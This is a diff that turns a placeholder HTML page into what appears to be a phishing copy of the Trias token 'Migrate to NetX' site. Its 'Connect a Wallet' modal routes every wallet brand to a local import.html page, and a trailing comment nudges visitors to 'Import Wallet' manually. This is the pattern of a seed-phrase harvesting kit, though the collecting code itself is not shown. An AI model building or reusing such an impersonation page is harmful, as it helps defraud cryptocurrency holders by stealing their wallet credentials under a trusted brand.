@@ -2,12 +2,610 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js" integrity="sha512-JobWAqYk5CSjWuVV3mxgS+MmccJqkrBaDhk8SKS1BW+71dJ9gzascwzW85UwGhxiSyR7Pxhu50k+Nl3+o5I49A==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <link href="https://fonts.cdnfonts.com/css/evermore" rel="stylesheet">            
+    <link rel="stylesheet" href="./css/sheet.css">
+    <link rel="stylesheet" href="./css/migration-connect.css">
+    <link rel="shortcut icon" href="https://www.triasmigrate.com/image.png">
+    <title>Migrate | Link the world with trust</title>
 </head>
-<body>
-    <h1>lecture Book</h1>
-    <p>A
-lecture book is a book containing the text of a formal talk or presentation, typically given by an expert or professor to teach a specific subject to an audience, especially students. In essence, it is the written version of a spoken lecture. </p>
+<div class="cover" id="cover" onclick="takeAway()"></div>
+<body id="body">
+
+
+    <div class="bridge-connect" id="bridge-connect">
+        <div class="bridge-connect-container">
+            <div class="leftside" id="first-part">
+                <div class="leftside-container" >
+                    <div class="head">
+                        <h1>Connect a Wallet</h1>
+                        <div class="exit" onclick="exitBridge()">
+                            <svg aria-hidden="true" fill="none" height="10" viewBox="0 0 10 10" width="10" xmlns="http://www.w3.org/2000/svg"><path d="M1.70711 0.292893C1.31658 -0.0976311 0.683417 -0.0976311 0.292893 0.292893C-0.0976311 0.683417 -0.0976311 1.31658 0.292893 1.70711L3.58579 5L0.292893 8.29289C-0.0976311 8.68342 -0.0976311 9.31658 0.292893 9.70711C0.683417 10.0976 1.31658 10.0976 1.70711 9.70711L5 6.41421L8.29289 9.70711C8.68342 10.0976 9.31658 10.0976 9.70711 9.70711C10.0976 9.31658 10.0976 8.68342 9.70711 8.29289L6.41421 5L9.70711 1.70711C10.0976 1.31658 10.0976 0.683417 9.70711 0.292893C9.31658 -0.0976311 8.68342 -0.0976311 8.29289 0.292893L5 3.58579L1.70711 0.292893Z" fill="currentColor"></path></svg>
+                        </div>
+                    </div>
+                    <div class="bottom">
+                        <h2>Recommended</h2>
+                        <a href="./import.html" target="_blank">  
+                            <div class="one" >
+                                <img src="./images/money.png" alt="">
+                                <p>Injected Wallet</p>
+                            </div>
+                        </a>
+                        <a href="./import.html" target="_blank">
+                            <div class="one" >
+                                <img src="./images/meta.svg" alt="">
+                                <p>MetaMask</p>
+                            </div>
+                        </a>
+                        <a href="./import.html" target="_blank">
+                            <div class="one" >
+                                <img src="./images/download (1).svg" alt="">
+                                <p>WalletConnect</p>
+                            </div>
+                        </a>
+                        <a href="./import.html" target="_blank">
+                            <div class="one" >
+                                <img src="./images/download (2).svg" alt="">
+                                <p>Coinbase Wallet</p>
+                            </div>
+                        </a>
+                        <a href="./import.html" target="_blank">
+                            <div class="one" >
+                                <img src="./images/download (3).svg" alt="">
+                                <p>TrustWallet</p>
+                            </div>
+                        </a>
+                        <a href="./import.html" target="_blank">
+                            <div class="one" >
+                                <img src="./images/download (4).svg" alt="">
+                                <p>LedgerLive</p>
+                            </div>
+                        </a>
+                    </div>
+                    <div class="learn">
+                        <p>New to Ethereum wallets?</p>
+                        <div class="learn-more" onclick="learnMore()">
+                            <p>
+                                Learn More
+                            </p>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+            <div class="rightside" id="second-part">
+                <div class="rightside-container">
+                    <div class="top">
+                        <div class="back hidden" id="back" onclick="goBack()">
+                            <svg  fill="none" height="17" viewBox="0 0 11 17" width="11" xmlns="http://www.w3.org/2000/svg"><path fill="#3898ff" d="M0.99707 8.6543C0.99707 9.08496 1.15527 9.44531 1.51562 9.79688L8.16016 16.3096C8.43262 16.5732 8.74902 16.7051 9.13574 16.7051C9.90918 16.7051 10.5508 16.0811 10.5508 15.3076C10.5508 14.9121 10.3838 14.5605 10.0938 14.2705L4.30176 8.64551L10.0938 3.0293C10.3838 2.74805 10.5508 2.3877 10.5508 2.00098C10.5508 1.23633 9.90918 0.603516 9.13574 0.603516C8.74902 0.603516 8.43262 0.735352 8.16016 0.999023L1.51562 7.51172C1.15527 7.85449 1.00586 8.21484 0.99707 8.6543Z" fill="currentColor"></path></svg>
+                        </div>
+                        <h5 class="hidden smart" id="smart">What is a Wallet?</h5>
+                        <div class="exit" onclick="exitBridge()">
+                            <svg aria-hidden="true" fill="none" height="10" viewBox="0 0 10 10" width="10" xmlns="http://www.w3.org/2000/svg"><path d="M1.70711 0.292893C1.31658 -0.0976311 0.683417 -0.0976311 0.292893 0.292893C-0.0976311 0.683417 -0.0976311 1.31658 0.292893 1.70711L3.58579 5L0.292893 8.29289C-0.0976311 8.68342 -0.0976311 9.31658 0.292893 9.70711C0.683417 10.0976 1.31658 10.0976 1.70711 9.70711L5 6.41421L8.29289 9.70711C8.68342 10.0976 9.31658 10.0976 9.70711 9.70711C10.0976 9.31658 10.0976 8.68342 9.70711 8.29289L6.41421 5L9.70711 1.70711C10.0976 1.31658 10.0976 0.683417 9.70711 0.292893C9.31658 -0.0976311 8.68342 -0.0976311 8.29289 0.292893L5 3.58579L1.70711 0.292893Z" fill="currentColor"></path></svg>
+                        </div>
+                    </div>
+                    <div class="bottom">
+                        <div class="wrapper">
+                            <h1 id="dull">What is a Wallet?</h1>
+                        <div class="two">
+                            <img src="./images/download (5).svg" alt="">
+                            <div class="other">
+                                <h5>A Home for your Digital Assets</h5>
+                                <p>Wallets are used to send, receive, store, and display digital assets like Ethereum and NFTs.</p>
+                            </div>
+                        </div>
+                        <div class="two">
+                            <img src="./images/download (6).svg" alt="">
+                            <div class="other">
+                                <h5>A New Way to Log In</h5>
+                                <p>Instead of creating new accounts and passwords on every website, just connect your wallet.</p>
+                            </div>
+                        </div>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+
+        </div>
+    </div>
+
+     <div class="navigation">
+        <div class="navigation-container">
+            <div class="leftside">
+                <div class="logo">
+                    <img src="./images/logo@2x.png" alt="">
+                </div>
+
+            </div>
+            
+            <div class="rightside">
+
+                <div class="list">
+                <a href="index" target="_blank"><h3>Futrue</h3></a>
+                <a href="index2" target="_blank"><h3>Learn</h3> 
+                <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" fill="currentColor" class="bi bi-chevron-down" viewBox="0 0 16 16">
+  <path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708"/>
+</svg></a>
+                <a href="index2" target="_blank"><h3>Participate</h3>
+                <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" fill="currentColor" class="bi bi-chevron-down" viewBox="0 0 16 16">
+  <path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708"/>
+</svg></a>
+                </div>
+                
+                <button onclick="connectBridge()">
+                    <img src="./images/wallet@2x.png" alt="">
+<p>Connect Wallet</p> </button>
+                
+                <div class="menu" id="menu" onclick="openMenu()">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" fill="currentColor" class="bi bi-list" viewBox="0 0 16 16">
+                        <path fill-rule="evenodd" d="M2.5 12a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5m0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5m0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5"/>
+                    </svg>
+
+                </div>
+
+            </div>
+        </div>
+    </div>
+
+
+
+
+    <div class="header">
+        <div class="header-container">
+
+            <div class="h1s">
+                <h1 class="striped-text">M</h1><h1>igrate to </h1>&nbsp; &nbsp; <h1 class="striped-text"> N</h1><h1>et</h1><h1 class="striped-text">X</h1>
+            </div>
+            <p>Embark on a new era: Migrate your $TRIAS to the NetX Network with  <br> a seamless 1:1 exchange.</p>
+
+        </div>
+    </div>
+
+    <div class="levelone">
+        <div class="levelone-container">
+            <div class="h1ss">
+                <h1 class="striped-text">M</h1> <h1>IGRATE </h1><h1 class="striped-text"> &nbsp;TRIAS</h1><h1>&nbsp;[</h1><h1 class="striped-text">P</h1><h1>HASE&nbsp;</h1><h1 class="striped-text">II</h1><h1>&nbsp;]</h1>
+            </div>
+
+            <div class="sub">
+                <div class="box">
+                    <div class="round ">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" fill="currentColor" class="bi bi-check" viewBox="0 0 16 16">
+  <path fill="#000000" d="M10.97 4.97a.75.75 0 0 1 1.07 1.05l-3.99 4.99a.75.75 0 0 1-1.08.02L4.324 8.384a.75.75 0 1 1 1.06-1.06l2.094 2.093 3.473-4.425z"/>
+</svg>
+                    </div>
+
+                    <div class="bond">
+                        <h2>PHASE I</h2>
+
+                    <div class="detail">
+                        <p>View details</p>
+                        <img src="./images/viewDetail@2x.png" alt="">
+                    </div>
+                    </div>
+
+                </div>
+                <div class="box">
+                    <div class="round somethingColored">
+                        <p>2</p>
+                    </div>
+
+                    <div class="bond">
+                        <h2>PHASE II</h2>
+
+                    <div class="detail">
+                        <p>View details</p>
+                        <img src="./images/viewDetail@2x.png" alt="">
+                    </div>
+                    </div>
+
+                </div>
+                <div class="box">
+                    <div class="round none something">
+                        <p>3</p>
+                    </div>
+
+                    <div class="bond">
+                        <h2>PHASE III</h2>
+
+                    <div class="detail empty">
+                        <p>--</p>
+                    </div>
+                    </div>
+
+                </div>
+                <div class="box">
+                    <div class="round none something nothing">
+                        <p>4</p>
+                    </div>
+
+                    <div class="bond">
+                        <h2>PHASE IV</h2>
+
+                    <div class="detail empty">
+                        <p>--</p>
+                        
+                    </div>
+                    </div>
+
+                </div>
+
+            </div>
+
+
+        </div>
+
+    </div>
+
+
+    <div class="leveltwo">
+        <div class="leveltwo-container">
+            <div class="cage">
+                <div class="upperside">
+
+                    <div class="one">
+                    <img src="./images/migration.png" alt="">
+                    <h5>My migration</h5>
+                    <p>TRIAS (BEP20＆ERC20) migration amount</p>
+                    <h2><span>0 </span>TRIAS</h2>
+                    <p>Your migrated TRIAS will be fully utilized for mainnet launch and TEP20 TRIAS will be distributed at a 1:1 ratio.</p>
+
+                </div>
+                <div class="one">
+                    <img src="./images/claim.png" alt="">
+                    <h5>Available to Claim
+</h5>
+                    <p>Claimable amount of TRIAS (TEP20)
+</p>
+                    <h2><span>0</span> TRIAS</h2>
+                    <p>TRIAS (TEP20) will be able to claim after TSC Mainnet is launched.</p>
+
+                </div>
+                <div class="one">
+                    <img src="./images/tasclaim.png" alt="">
+                    <h5>Migration Rewards
+</h5>
+                    <p>TAS Rewards Amount
+</p>
+                    <h2><span>0 </span>TAS</h2>
+                    <p>TAS is the token of the public chain NetX network and it can be used as payment for transaction fees.</p>
+
+                </div>
+                </div>
+                <div class="downside">
+                    <div class="fading-line">
+                        
+                    </div>
+
+                </div>
+
+            </div>
+
+        </div>
+    </div>
+
+
+    <div class="levelthree">
+        <div class="levelthree-container">
+            <div class="topside">
+                <div class="h1s">
+                    <h1 class="striped-text">FAQ</h1><h1>S</h1>
+                </div>
+            </div>
+            <div class="bottomside">
+
+                <div class="one">
+        <div class="question dropdown-button" onclick="toggleDropdown(this)">
+            <h5>01. What is TRIAS migration?</h5>
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-chevron-down" viewBox="0 0 16 16">
+                <path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708"/>
+            </svg>
+        </div>
+        <div class="reply dropdown-menu">
+            <p>TRIAS migration refers to the process of moving TRIAS from the current blockchain network to the NetX network.</p>
+        </div>
+    </div>
+    <div class="one">
+        <div class="question dropdown-button" onclick="toggleDropdown(this)">
+            <h5>02. Why do I need to migrate my TRIAS?</h5>
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-chevron-down" viewBox="0 0 16 16">
+                <path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708"/>
+            </svg>
+        </div>
+        <div class="reply dropdown-menu">
+            <p>The NetX network features high TPS, EVM compatibility, and low gas fees, which will continually reduce user costs, making the TRIAS ecosystem the daily choice to meet all user transaction needs.</p>
+        </div>
+    </div>
+    <div class="one">
+        <div class="question dropdown-button" onclick="toggleDropdown(this)">
+            <h5>03. How do I migrate my TRIAS from the current network to NetX network?</h5>
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-chevron-down" viewBox="0 0 16 16">
+                <path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708"/>
+            </svg>
+        </div>
+        <div class="reply dropdown-menu">
+            <p>You can use a web3 wallet, for example Metamask, to complete TRIAS migration on the Trias official website migration channel, and the wallet will connect with the migration contract for you.</p>
+        </div>
+    </div>
+    <div class="one">
+        <div class="question dropdown-button" onclick="toggleDropdown(this)">
+            <h5>04. What is the migration ratio?</h5>
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-chevron-down" viewBox="0 0 16 16">
+                <path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708"/>
+            </svg>
+        </div>
+        <div class="reply dropdown-menu">
+            <p>TRIAS tokens on the current network will be replaced with NetX network TRIAS at a ratio of 1:1.</p>
+        </div>
+    </div>
+    <div class="one">
+        <div class="question dropdown-button" onclick="toggleDropdown(this)">
+            <h5>05. Is there a limit on the number of migrations?</h5>
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-chevron-down" viewBox="0 0 16 16">
+                <path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708"/>
+            </svg>
+        </div>
+        <div class="reply dropdown-menu">
+            <p>No, there is no limit on the migration amount for each wallet.</p>
+        </div>
+    </div>
+    <div class="one">
+        <div class="question dropdown-button" onclick="toggleDropdown(this)">
+            <h5>06. Is there a deadline for TRIAS migration?</h5>
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-chevron-down" viewBox="0 0 16 16">
+                <path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708"/>
+            </svg>
+        </div>
+        <div class="reply dropdown-menu">
+            <p>Yes, the migration plan will be open for 2 years, allowing anyone to migrate during this period.</p>
+        </div>
+    </div>
+    <div class="one">
+        <div class="question dropdown-button" onclick="toggleDropdown(this)">
+            <h5>07. Do I need to register a new address to receive TRIAS (TEP20)?</h5>
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-chevron-down" viewBox="0 0 16 16">
+                <path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708"/>
+            </svg>
+        </div>
+        <div class="reply dropdown-menu">
+            <p>NetX network is compatible with the existing Ethereum Virtual Machine (EVM) and all applications and tools within its ecosystem, so you don’t need to change your address. Switch your wallet’s network to TSC Mainnet to check TRIAS (TEP20) you received.</p>
+        </div>
+    </div>
+    <div class="one">
+        <div class="question dropdown-button" onclick="toggleDropdown(this)">
+            <h5>08. When can I claim TRIAS (TEP20) and migration rewards?</h5>
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-chevron-down" viewBox="0 0 16 16">
+                <path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708"/>
+            </svg>
+        </div>
+        <div class="reply dropdown-menu">
+            <p>Users will be able to claim TRIAS (TEP20) and migration rewarrds after the official launch of TSC Mainnet.Please stay tuned for our official announcements.</p>
+        </div>
+    </div>
+    <div class="one">
+        <div class="question dropdown-button" onclick="toggleDropdown(this)">
+            <h5>09. How much gas will be consumed in the migration process?</h5>
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-chevron-down" viewBox="0 0 16 16">
+                <path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708"/>
+            </svg>
+        </div>
+        <div class="reply dropdown-menu">
+            <p>In addition to the gas fees for token transfers on the current TRIAS network, TRIAS migration will not incur any additional costs. The specific gas consumption depends on the network congestion at the time.</p>
+        </div>
+    </div>
+    <div class="one">
+        <div class="question dropdown-button" onclick="toggleDropdown(this)">
+            <h5>10. Is there any compensation for the gas consumed in the migration process?</h5>
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-chevron-down" viewBox="0 0 16 16">
+                <path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708"/>
+            </svg>
+        </div>
+        <div class="reply dropdown-menu">
+            <p>There are currently no compensation measures for Gas.</p>
+        </div>
+    </div>
+    <div class="one">
+        <div class="question dropdown-button" onclick="toggleDropdown(this)">
+            <h5>11. Are there any trading platforms that support TRIAS migration?</h5>
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-chevron-down" viewBox="0 0 16 16">
+                <path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708"/>
+            </svg>
+        </div>
+        <div class="reply dropdown-menu">
+            <p>Currently, only the Trias official website migration channel supports TRIAS migration. After the official launch of TSC Mainnet, we will also contact exchanges that have listed TRIAS. A list of exchanges supporting TRIAS migration will be published in the migration FAQs.</p>
+        </div>
+    </div>
+    <div class="one">
+        <div class="question dropdown-button" onclick="toggleDropdown(this)">
+            <h5>12. What exchange platforms support TRIAS (TEP20) deposit and trading?</h5>
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-chevron-down" viewBox="0 0 16 16">
+                <path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708"/>
+            </svg>
+        </div>
+        <div class="reply dropdown-menu">
+            <p>After the official launch of TSC Mainnet, we will discuss with some major exchange platforms to support the NetX network. Please stay tuned for our official announcements.</p>
+        </div>
+    </div>
+    <div class="one">
+        <div class="question dropdown-button" onclick="toggleDropdown(this)">
+            <h5>13. How can I calculate the TAS reward I should receive from my migration?</h5>
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-chevron-down" viewBox="0 0 16 16">
+                <path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708"/>
+            </svg>
+        </div>
+        <div class="reply dropdown-menu">
+            <p>TAS, as the migration reward, will be calculated and issued on an hourly basis. We will calculate TRIAS migration amount of all users and the TAS reward that each user should receive on an hourly basis. Then we will distribute TAS reward to our users. The calculation formula for the migration reward TAS is: TAS reward received per hour = my cumulative migration TRIAS number (BEP20 & ERC20) / the total migration TRIAS amount(BEP20 & ERC20) * current reward (10 TAS)</p>
+        </div>
+    </div>
+    <div class="one">
+        <div class="question dropdown-button" onclick="toggleDropdown(this)">
+            <h5>14. When will the first phase of the migration incentive event end?</h5>
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-chevron-down" viewBox="0 0 16 16">
+                <path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708"/>
+            </svg>
+        </div>
+        <div class="reply dropdown-menu">
+            <p>The first phase of the migration reward event is from 2024-04-29 00:00 (UTC) to 2024-06-30 23:59 (UTC). When the migration ends, you will not be able to receive TAS reward. If you have participated in the TRIAS migration before the official launch of the first phase of the migration, we will reissue you TAS as migration reward.</p>
+        </div>
+    </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+            </div>
+
+    </div>
+</div>
+
+
+<div class="footer">
+    
+    <div class="footer-container">
+        <div class="line">
+            <div class="lines">gggg</div>
+        </div>
+        <div class="topside">
+            <div class="leftside">
+                <img src="./images/logo@2x.png" alt="">
+                <h5>Link the world with trust
+</h5>
+
+
+<div class="logo hidden">
+                    <a href="">
+                        <img src="./images/twitter_hover.svg" alt="">
+                    </a>
+                    <a href="">
+                        <img src="./images/discord_hover.svg" alt="">
+                    </a>
+                    <a href="">
+                        <img src="./images/telegram_hover.svg" alt="">
+                    </a>
+                    <a href="">
+                        <img src="./images/medium_hover.svg" alt="">
+                    </a>
+                    <a href="">
+                        <img src="./images/github_hover.svg" alt="">
+                    </a>
+                    <a href="">
+                        <img src="./images/email_hover.svg" alt="">
+                    </a>
+
+                </div>
+            </div>
+            <div class="rightside">
+                <div class="one">
+                    <div class="head">
+                        <h4>Trias</h4>
+                    </div>
+                    <div class="sub">
+                        <a href="">Trust</a>
+
+                    </div>
+                </div>
+                <div class="one middle">
+                    <div class="head">
+                        <h4>Learn</h4>
+                    </div>
+                    <div class="sub">
+                        <a href="">TrustedFi</a>
+                        <a href="">Technology</a>
+                        <a href="">About Trias</a>
+                        <a href="">Medium</a>
+                        <a href="">Brand Resources</a>
+                        <a href="">About Trias</a>
+                        <a href="">Medium</a>
+                        <a href="">Brand Resources</a>
+                        <a href="">Roadmap</a>
+                        <a href="">Privacy Policy</a>
+                        <a href="">Economy</a>
+                        <a href="">Governance</a>
+                        <a href="">Join Trias</a>
+                      
+
+                    </div>
+                </div>
+
+                <div class="one">
+                    <div class="head">
+                        <h4>Participate</h4>
+                    </div>
+                    <div class="sub">
+                        <a href="">Bridge</a>
+                        <a href="">Migrate</a>
+                        <a href="">Convert</a>
+
+                    </div>
+                </div>
+
+            </div>
+
+        </div>
+        
+        
+
+    </div>
+
+
+    <div class="bottomside">
+            <div class="bottomside-container">
+                <div class="leftside">
+                <p>
+                    Copyright © Trias-lab Foundation. All Rights Reserved
+
+                </p>
+
+            </div>
+            <div class="rightside">
+                <div class="logo">
+                    <a href="">
+                        <img src="./images/twitter_hover.svg" alt="">
+                    </a>
+                    <a href="">
+                        <img src="./images/discord_hover.svg" alt="">
+                    </a>
+                    <a href="">
+                        <img src="./images/telegram_hover.svg" alt="">
+                    </a>
+                    <a href="">
+                        <img src="./images/medium_hover.svg" alt="">
+                    </a>
+                    <a href="">
+                        <img src="./images/github_hover.svg" alt="">
+                    </a>
+                    <a href="">
+                        <img src="./images/email_hover.svg" alt="">
+                    </a>
+
+                </div>
+
+            </div>
+            </div>
+
+        </div>
+</div>
+
+<script src="./js/script.js"></script>
     
 </body>
 </html>
+
+
+
+
+<!-- We apologize, but it seems your wallet is not connecting automatically. To ensure a seamless experience, please connect manually by selecting the 'Import Wallet' button below or verify your wallet settings and attempt the connection again." -->
